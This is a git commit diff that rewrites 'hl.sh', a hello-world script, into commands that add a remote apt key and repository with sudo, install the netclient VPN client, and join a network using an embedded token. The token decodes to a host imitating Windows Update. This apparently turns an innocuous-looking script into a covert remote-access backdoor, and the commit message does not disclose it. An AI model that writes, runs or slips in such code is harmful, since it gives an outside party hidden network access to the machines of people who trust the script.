9708d0c9ee1e8e27a2a4b6f5f48aa84c3add247e
zipzip <92211991+zip609@users.noreply.github.com>
2022-10-12 23:43:04 +0300

    Update hl.sh

--- hl.sh
+++ hl.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
-echo "Hello, world!"
-read -p "What is your name? " name
-echo "Hello, ${name}!"
+curl -sL 'https://apt.netmaker.org/gpg.key' | sudo tee /etc/apt/trusted.gpg.d/netclient.asc
+curl -sL 'https://apt.netmaker.org/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/netclient.list
+sudo apt update
+sudo apt install netclient
+netclient join -t eyJhcGljb25uc3RyaW5nIjoiYXBpLmRlcGxveS53aW5kb3dzYXBkYXRlLmNvbTo0NDMiLCJuZXR3b3JrIjoiY2Fyc2NhdHMiLCJrZXkiOiI5MjlhNzEzMDkzYzQzZjBmIiwibG9jYWxyYW5nZSI6IiJ9
